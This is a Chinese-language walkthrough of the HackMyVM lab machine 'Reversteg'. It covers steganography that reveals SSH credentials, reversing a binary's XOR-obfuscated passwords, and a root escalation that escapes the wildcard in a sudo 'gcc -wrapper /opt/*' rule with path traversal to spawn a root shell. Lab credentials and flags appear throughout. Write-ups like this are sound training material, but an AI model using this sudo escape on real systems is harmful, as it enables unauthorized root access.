---
title: HackMyVM-Reversteg
published: 2025-03-09 16:23:40
tags: [HackMyVM]
category: 靶机
draft: false
---

# Reversteg.

> https://hackmyvm.eu/machines/machine.php?vm=Reversteg
> 

## 前期踩点

```
⚡ root@kali  ~  nmap -sP 192.168.56.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-22 03:32 EST
Nmap scan report for 192.168.56.1
Host is up (0.00029s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00028s latency).
MAC Address: 08:00:27:A9:3F:FD (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.104
Host is up (0.00027s latency).
MAC Address: 08:00:27:C9:D2:EF (Oracle VirtualBox virtual NIC)
```

```
⚡ root@kali  ~  nmap -sT -min-rate 10000 -p- 192.168.56.104
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-22 03:32 EST
Nmap scan report for 192.168.56.104
Host is up (0.00093s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:C9:D2:EF (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 11.60 seconds
```

```
⚡ root@kali  ~  nmap -sT -A -T4 -O -p 22,80 192.168.56.104
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-22 03:33 EST
Nmap scan report for 192.168.56.104
Host is up (0.00061s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
| ssh-hostkey:
|   2048 c2:91:d9:a5:f7:a3:98:1f:c1:4a:70:28:aa:ba:a4:10 (RSA)
|   256 3e:1f:c9:eb:c0:6f:24:06:fc:52:5f:2f:1b:35:33:ec (ECDSA)
|_  256 ec:64:87:04:9a:4b:32:fe:2d:1f:9a:b0:81:d3:7c:cf (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 08:00:27:C9:D2:EF (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.61 ms 192.168.56.104

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.09 seconds
```

访问`HTTP`，查看源码发现 

```jsx
 117db0148dc179a2c2245c5a30e63ab0 
```

```jsx
 Some people always don't understand the format of photos. 
```

![image.png](image%20126.png)

## 图片隐写

根据提示可以找到两张图片

![image.png](image%20127.png)

![image.png](image%20128.png)

使用`winhex`打开`jpg`图片

![image.png](image%20129.png)

`TGlmZSBpcyBmdWxsIG9mIHNjZW5lcnksIGxvb2sgY2FyZWZ1bGx5` =  `Life is full of scenery, look carefully` 

让我们仔细点，使用图片隐写工具来查找

`zsteg` 能找到一些字符串

```
 root@kali  ~/Desktop/test/reverseteg  zsteg 117db0148dc179a2c2245c5a30e63ab0.png
imagedata           .. text:"\n\n\n\t\t\t\n\n\n"
b1,rgb,lsb,xy       .. text:"morainelake"
b1,bgr,msb,xy       ..file: OpenPGP Public Key
b2,r,lsb,xy         .. text:"UUUUUUUU@"
b2,g,lsb,xy         .. text:"E@UAUUUUUUUUj"
b2,g,msb,xy         .. text:"UUUZs-VUU"
b2,b,lsb,xy         .. text:"EUUUUUUUUV"
b2,b,msb,xy         .. text:"_UUUoUUe"
b3,b,msb,xy         ..file: MPEG ADTS, layer I, v2,  96 kbps, Stereo
b3,rgb,lsb,xy       ..file: PGP Secret Sub-key -
b4,r,lsb,xy         .. text:"DEUTfgww"
b4,r,msb,xy         .. text:"M,\"\"\"\"\"\""
b4,g,lsb,xy         .. text: ["\"" repeated 10 times]
b4,g,msb,xy         .. text:"HDDDDDDDDDDH"
b4,b,lsb,xy         .. text:"3\"##2\"\"#33333333333333334DDDDDDDDDD4C333\"\"\""
b4,b,msb,xy         .. text:",\"\"\"\"\"\"\"\"\"\","
```

`morainelake` = 冰碛湖 （挠头）

使用`steghide` ，密码使用的是上面的`morainelake`

```jsx
⚡ root@kali  ~/Desktop/test/reverseteg  steghide extract -sf 117db0148dc179a2c2245c5a30e63ab0.png
Enter passphrase: 
steghide: the file format of the file "117db0148dc179a2c2245c5a30e63ab0.png" is not supported.
```

```
⚡ root@kali  ~/Desktop/test/reverseteg  steghide extract -sf 117db0148dc179a2c2245c5a30e63ab0.jpg --passphrase morainelake
wrote extracted data to "secret.zip".
```

找到压缩包`secret.zip` ，解压需要密码，再使用上面的`morainelake` 试试

```jsx
 root@kali  ~/Desktop/test/reverseteg  unzip secret.zip 
Archive:  secret.zip
   creating: secret/
[secret.zip] secret/secret.txt password: 
 extracting: secret/secret.txt       
```

成功解压，`secret.txt` 得到一组账户密码

```jsx
⚡ root@kali  ~/Desktop/test/reverseteg/secret  cat secret.txt 
morainelake:660930334
```

登录`SSH`，成功

```jsx
⚡ root@kali  ~/Desktop/test/reverseteg/secret  ssh morainelake@192.168.56.104                                                    
Welcome to the target machine, enjoy the target machine, hope you have fun
morainelake@192.168.56.104's password: 
Linux reversteg 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Feb 12 12:30:24 2025 from 192.168.56.110
$ 
```

## 寻找UserFlag

当前目录下发现`note.txt` ，告诉我们`flag`在`history`里

```jsx
$ cat note.txt
morainelake is a very careless user with a very bad memory. He always throws things aside after organizing them. This time he accidentally lost the flag. Fortunately, the administrator has the historical records, but there are too many records to find the corresponding correct flag. Can you find it correctly?
"Don't worry about failures; worry about the chances you miss when you don't even try. After all, it's better to look back and say, 'I can't believe I did that,' than to look back and say, 'What if?' (You'll probably fail anyway.)"
```

查看当前目录下`history`

```jsx
$ cat history                         
flag{f2c37e838de7a392ad0a06706b8e085d}                                                                            
flag{7169dfc0baa126134898cbad82fa05c8}                                                                            
flag{b6d165811d79ef969b6dba02b17e7515}
flag{80c76fd7421fa86432cd149041237c93}                                                                            
flag{bd6d2c2d3341f62146e52131e6054d6c}                                                                            
flag{126a3c910cd193215df77fd15e12bc19}
flag{29cb75657792d831fe49824c8469681c}                                                                            
flag{c52104fb9a88eb1d2fa98089da436b2d}                                                                                                                                                                                              
flag{c162c18399757600494cf451d1731f4e}
flag{ca5dc62a5a5accd9acef8443c7c05d5b}        
flag{cd65a0e12d20a418db4fa25830e198d6}                                                                            
flag{4a62f46821c547ebfe8b3cfb68b4460b}                                                                            
flag{276ad96e3911334974f7123e74542547}
flag{d1318e29564a2bca8c0cd252773ed50f}
flag{9d7efaeda0426e81a620a590062c0253}   
flag{b6572d3e495f9e20bd48f4dfab698afa}
flag{5e48556cd3ab1bb8ecada1c48c09683e}        
flag{d7557776d621dc1fa37a5dd5e28eebf1}                                                                            
flag{e4ee2346a545efa9ec71d0809506bbe3}                   
flag{69cdc413a202c8b975b1f5d58c0abc31}               
flag{e42177ea9bd9af02cbee28714c0bf810}
flag{ad585a40ef71b01eab289301972ea73c}                                                                            
flag{de85d1b5dae17c1b2df795057aea9d63}
flag{29ee552a0fc65424f06ff0e9ebf3f702}                                                                                                                                                                                              
flag{61c12af13786456ab6f43039b66b9520}                                                                            
flag{3f54da44fd4015ead6ca7a45d44119a0} 
flag{7763434b99aa5fe05b57a715df13ac0f}                                                                            
flag{67a3242f410382ae0aad70cf70c39fc1}                   
flag{609a3fde1d0ff0478600003373ab9e1f}                                                                            
flag{21a0414cd01ee07bdbdc35145d7fd692}                                                                            
flag{4086a2e2d772bc9cc60619ac80b66e08}         
flag{9b46b84c2efac472546d2ea15b827d2d}                   
flag{ecdb0232a6f7253b9e62f47b0e0abde4}                                                                            
flag{d65d4e8f4be0324bfc228262f9c3057f}
flag{5683373ddd90fad10cb9cef94c22151f}                   
flag{31d1f2a69718590fe0d9bd799c1f35d5}
flag{5dd507404a37d5f2bcab199acab96359}     
flag{7ac28659db3a7ab5264ad5332e26bc08}                                                                            
flag{f3f8f735c14c017739e973afca6a0ab1}                                                                                                                                                                                              
flag{68eb761ef934a9f1e4af3ac29bbdb7d7}                                                                            
flag{263161187e89c4faf230e26c911e8654}                                                                                                                                                                                              
flag{002afd16e27b0b44c47b8d63bc30abf6}                                                                            
flag{636f5acb6eaeaae19e22d285f30f9b20}
flag{bab9bf3305a412346ed4f5f6b02b395a}                                                                            
flag{6877e8de891b0445b85405093f965b50}                                                                            
flag{b7f67648519d1e5e02463ac712f0528d}
flag{0860e3cff2ca853fac7961bdd9b8ec42}                                                                            
flag{992e4183fe6dfc36addd95f2d4a06dfc}                                                                            
flag{26fa3911daefda20f0f3ae0ba9b27dbf}
flag{2b13920ee34622c50fd55d1360d42c0f}                                                                            
flag{56b5abe9dc564d4edd05168698999c8e}                                                                                                                                                                                              
flag{a7a9fa80ec47bdbe4be4c484c4522978}
flag{b7d3ff8f7f5d49ddfc0c29cd9674f16d}        
flag{1bcabdf36478c6fd83b5908dbcd4af1d}                                                                            
flag{3ef11c54f23072dc43b7fa40bae7f70f}                                                                            
flag{c0625cd0befb46fdcacb0e18db63ef34}
flag{496d30e0ac86097e1bb3b9ee0107ca70}
flag{c42ef3365ad87a27ffa5d3dbab874109}   
flag{3ce203e761cc63f9a7c15ece415f007e}
flag{dd7485615d0a6a566812072661ace5c5}        
flag{698fa5d1182730a9604e08de81ff9cfe}                                                                            
flag{5008836cd24994e6c72bb8686fbe5a8f}                   
flag{81e27314d7583510226b13d80580f59e}               
flag{d83f3546b77277dae3969108c75ad0cd}
flag{62bd6854dca21e1d60f592dcf5b25de0}                                                                            
flag{fc8941b9088096e99b635cc3e07080d6}
flag{30999f5520de28d96b01b3d1853340b1}                                                                                                                                                                                              
flag{014067f25f20519306013a2d31eac5b5}                                                                            
flag{cb1e8b44c63c6de06f3cb20727062ba6} 
flag{629c11156aff51387dafccce728de96c}                                                                            
flag{d69e5df2a026ffc85ff3f2ed43d61bef}                   
flag{86ae64e63c5c9968363240521ae5164b}                                                                            
flag{399b591e5007022b3e66e588db6f1fe3}                                                                            
flag{9adf3951c5f3b93f673927f1d8901278}         
flag{b9cc60e55d40258992c8e25aaa9bf089}                   
flag{c230e3baf3539668e10212ef94d8291d}                                                                            
flag{e9a0c405c5b7694d2740784343e1fef8}
flag{231d326385eb50f0d4ab53f54c1dbc80}                
flag{7a765f4fd76c305a2fe26dda4ea36e9d}
flag{a4091483a5dcbb0c40b20b2c1c24bf47}     
flag{ad17178bf859d19a81324d9d0c8c244a}                                                                            
flag{5f420eb7da0e6f206089e6554cdae340}                                                                                                                                                                                              
flag{9823f50f68ed769bc90b2cbd68b56b4c}                                                                            
flag{d1d9e02392b4b72b0885db7490f619cd}                                                                                                                                                                                              
flag{39c022930d47f7e761c8cb3efd16bbc8}                                                                            
flag{add7fa68ef90faa3605f2285f64f2882}
flag{6752c068769dc8f62356041f6d4304a6}                                                                            
flag{52934e2768295b22329d429b0f24f601}                                                                            
flag{4e1357260b5d9c39789f7f7a5946bb44}
flag{74768d2a8bfad0807a23c5539805f39c}                                                                            
flag{5bc1ecf9e7d083685d5287b0e79c74ee}                                                                            
flag{377af1b4cc6eba82a7a55d4bb5403f56}
flag{2cc92ef26991c388ff0887d3eb9fcce1}                                                                            
flag{471c053dcc2db1c2aaf564bdad14db82}                                                                                                                                                                                              
flag{4a8dab9ecd0d659ca9883a4be50c7c77}
flag{95cadc47bc4d07b45ef91850a8e83f3f}        
flag{9b0358eda57e0994c0c353f60274f66d}                                                                            
flag{847e9105fb30ca4dd7ce1716b0aed40e}                                                                            
flag{5a1e7d163a42e1361eb10db6fd11a0d9}
flag{7fba1dd72baaa553e86f861d60f26a84}
flag{1eecb7adc8bae78ad0cb33d8b4458df6}   
flag{2c87d786b58ff9f4ba77972e09f36479}
flag{275e8feb6e9df14c92a0c28bd82697db}        
flag{7e5b56e54230db025c9e4f42fc5c76e3}                                                                            
flag{a468c4a459a1dd6f30e8b07852de2bdd}                   
flag{1865052c7cdebb8fd88da52a4140e921}               
flag{4d66e030e6c35216bb2226dfcbca2921}
flag{72fd280733d6d7d2527083581f90af2f}                                                                            
flag{aaa940d0c621a241d00218ddf1f4a1aa}
flag{5db9c2f2c3c0ef2881fe6dd6e4674f3b}                                                                                                                                                                                              
flag{557a89952e95d11bc4a2a702da7b9a14}                                                                            
flag{fedda55807704e79fcb60ddf8f7c3f31} 
flag{0501f784515d8263ed318d07686fe8eb}                                                                            
flag{8cf613f987047536e87d517758d405ed}                   
flag{2916e9b49e43bd17a0ffcbf386b7fdea}                                                                            
flag{1dd25fe1d7bb2bf8ae2ec5a6e2cfd1b6}                                                                            
flag{fb8a8b548592e0a106874ef24dbb1b48}         
flag{b2f1e068a5bab886a3b9a36bbac373b4}                   
flag{0da1df37e671df4d30fa3ea2547bd86a}                                                                            
flag{703bd451303a69c4c697d8996c77126f}
```

…… 使用`wc`查看行数，会发现不一样

```jsx
$ cat history | wc -l
178
$ cat history | wc -l
19
$ cat history | wc -l
19
$ cat history | wc -l
19
```

```jsx
flag{37dc6d45426cf3e537ab074c230e13a8}
flag{9f65be4cb0954563eb503822593b4dae}
flag{4bd61aede95a77cb27d4b4f8fb768ada}
flag{fc8941b9088096e99b635cc3e07080d6}
flag{82857b70a6b1ceaa259060c08bc35f2c}
flag{8a1e059553c1c818a2006bb775c80486}
flag{c14c7a0e2b0aa3ea458a93a5d903a8d6}
flag{ed70a45788f53f181cbfb04fe46ffff4}
flag{143b944172b82222b44871b7efe46c57}
flag{01d1db3ac8a512f7f1d601f18afc0ef5}
flag{25f958709796bf7dfe83ec944005ae61}
flag{d50cf51b391c603c36eccb3ba81f51a2}
flag{81c51a4a8c08afdecc4e57dded278029}
flag{dcb4b3f9d4c878d4cba3e635b00aca14}
flag{e3007720e4ab09cd32921191f485eaf8}
flag{b4fd276be5ca023a5b78eb98086418a9}
flag{9fd7237c5d72677e5590b21218320122}
flag{7039cat: not found204f39c180cbd4}
0lag{47ea4bd04049f8874838e9644f4a19b4}
```

将两次的结果作对比`flag{fc8941b9088096e99b635cc3e07080d6}` 是正确的`flag`

## Re

先信息收集一波

在`/opt`文件夹下发现`reverse`

```jsx
$ ls -al
total 28
drwxr-xr-x  2 root root  4096 Feb 20 19:05 .
drwxr-xr-x 18 root root  4096 Jan  7 21:50 ..
-rwxr-xr-x  1 root root 17088 Feb 12 12:09 reverse
$ ./reverse
Enter passwords or Enter H coward mode:
q
w
e
r
[-] Incorrect password!
```

并且靶机标题也是与`reverse`有关，将`reverse`传出来

放到`IDA`进行分析（核心代码）

```jsx
  puts("Enter passwords or Enter H coward mode:");
  v20 = 0;
  while ( 1 )
  {
    __isoc99_scanf("%s", &v4[7]);
    if ( strcmp(&v4[7], "H") )
      break;
    if ( ++v20 == 100 )
    {
      puts("Hint: Invert XOR Replace! ");
      goto LABEL_6;
    }
  }
  strcpy(dest, &v4[7]);
  __isoc99_scanf("%s %s %s", v10, &v9, &v8);
LABEL_6:
  v7 = 8203321;
  strcpy(v6, "/, 8:(");
  strcpy((char *)&v5 + 7, "!!|}yx{z");
  strcpy((char *)&v5, "(;$)(#");
  v19 = 77;
  v18 = (void *)xor_decrypt((char *)&v5 + 7, 77LL);
  v17 = (void *)xor_decrypt(v6, (unsigned int)v19);
  v16 = (char *)xor_decrypt(&v7, (unsigned int)v19);
  v15 = (char *)xor_decrypt(&v5, (unsigned int)v19);
  if ( (unsigned int)check_passwords((int)dest, (int)v10, (int)&v9, (int)&v8, (int)v18, (int)v17, v16, v15) )
  {
    strcpy(v4, "pvygob");
    v14 = 106;
    v13 = 10;
    ptr = (void *)caesar_decrypt(v4, 10LL);
    printf("[+] Enter the password successfully! you know: %s\n", (const char *)ptr);
    free(ptr);
  }
  else
  {
    puts("[-] Incorrect password!");
  }
```

分析来自于：`Grok`

```jsx
puts("Enter passwords or Enter H coward mode:");
v20 = 0;
while ( 1 )
{
    __isoc99_scanf("%s", &v4[7]);
    if ( strcmp(&v4[7], "H") )
        break;
    if ( ++v20 == 100 )
    {
        puts("Hint: Invert XOR Replace! ");
        goto LABEL_6;
    }
}
strcpy(dest, &v4[7]);
__isoc99_scanf("%s %s %s", v10, &v9, &v8);
```

- 提示用户输入密码，或者输入 "`H`" 进入所谓的 "`coward mode`"。
- 对用户输入的密码进行处理，并通过 `XOR` 解密和凯撒解密操作生成验证所需的数据。
- 使用 `check_passwords` 函数验证输入的密码是否正确。
- 如果验证通过，输出成功消息并解密一个隐藏字符串；否则，提示密码错误
- 当用户输入的不是 "`H`" 时，假设这是第一个密码，将其复制到 `dest` 中。
- 接着，使用 `scanf` 读取另外三个字符串，分别存储到 `v10`、`v9` 和 `v8` 中。这可能是验证所需的额外输入

```jsx
LABEL_6:
v7 = 8203321;
strcpy(v6, "/, 8:(");
strcpy((char *)&v5 + 7, "!!|}yx{z");
strcpy((char *)&v5, "(;$)(#");
v19 = 77;
v18 = (void *)xor_decrypt((char *)&v5 + 7, 77LL);
v17 = (void *)xor_decrypt(v6, (unsigned int)v19);
v16 = (char *)xor_decrypt(&v7, (unsigned int)v19);
v15 = (char *)xor_decrypt(&v5, (unsigned int)v19);
```

初始化数据`XOR`解密，解密

`v17 = (void *)xor_decrypt(v6, (unsigned int)v19);` == `bamuwe` （眼熟）

![image.png](image%20130.png)

`v15 = (char *)xor_decrypt(&v5, (unsigned int)v19);` == `eviden`

![image.png](image%20131.png)

`v18 = (void *)xor_decrypt((char *)&v5 + 7, 77LL);` == `ll104567` （群主）

![image.png](image%20132.png)

 `v16 = (char *)xor_decrypt(&v7, (unsigned int)v19);` == `ta0`

`v16`不能直接在`CyberChef`里面转，否则会变成乱码，因为`v7`是`int`格式，而`(char *)xor_decrypt` 需要将`v7`转为`Sting`格式

我们将其代码扒下来，直接打印`v16` ，我们创建`v16.c`

```jsx
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef unsigned char _BYTE;

_BYTE *xor_decrypt(const char *a1, char a2)
{
    _BYTE *v3;
    int v4;
    int i;

    v4 = strlen(a1);
    v3 = malloc(v4 + 1);
    for (i = 0; i < v4; ++i)
        v3[i] = a2 ^ a1[i];
    v3[v4] = 0;
    return v3;
}

int main()
{
    int v7 = 8203321;
    char v19 = 77;
    char *v16;

    v16 = (char *)xor_decrypt((const char *)&v7, (unsigned int)v19);

    printf("v16 content: %s\n", v16);

    free(v16);

    return 0;
}
```

然后编译并运行，得出`v16`是`ta0`

```jsx
 ⚡ root@kali  ~/Desktop/test/reverseteg  vim v16.c
 ⚡ root@kali  ~/Desktop/test/reverseteg  gcc v16.c -o v16                                       
 ⚡ root@kali  ~/Desktop/test/reverseteg  ./v16    
v16 content: ta0
```

那我们就得出`v15`-`v18`分别是`eviden` 、`ta0` 、`bamuwe` 、`ll104567`

然后程序调用`checkpassword`函数

```jsx
if ( (unsigned int)check_passwords((int)dest, (int)v10, (int)&v9, (int)&v8, (int)v18, (int)v17, v16, v15) )
```

最后根据参数我们依次输入密码

```jsx
$ ./reverse
Enter passwords or Enter H coward mode:
ll104567
bamuwe
ta0
eviden
[+] Enter the password successfully! you know: flower
```

得到密码`flower` ？或者`ll104567bamuweta0eviden`

查看`/etc/passwd`下存在哪些用户有`shell`的，用户`welcome`

```jsx
welcome:x:1001:1001::/home/welcome:/bin/sh
```

切换到`welcome` ，密码是`ll104567bamuweta0eviden`

```jsx
morainelake@reversteg:~$ su welcome
Password: 
```

## 提权

查看权限

```jsx
$ /bin/bash
welcome@reversteg:/home/morainelake$ sudo -l
Matching Defaults entries for welcome on reversteg:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on reversteg:
    (ALL : ALL) NOPASSWD: /usr/bin/gcc -wrapper /opt/*
```

查看`gcc`提权方案

```jsx
gcc -wrapper /bin/sh,-s .
```

其实`/usr/bin/gcc -wrapper /opt/*`中的`*`是可以逃逸的（群主的思路）

```jsx
welcome@reversteg:/opt$ sudo /usr/bin/gcc -wrapper /opt/../../bin/sh,-s .
# id
uid=0(root) gid=0(root) groups=0(root)
```

读取`RootFlag`

```jsx
# cat /root/root.txt
flag{4f1eab505b71cd930b0eccd83ff0cfef}
```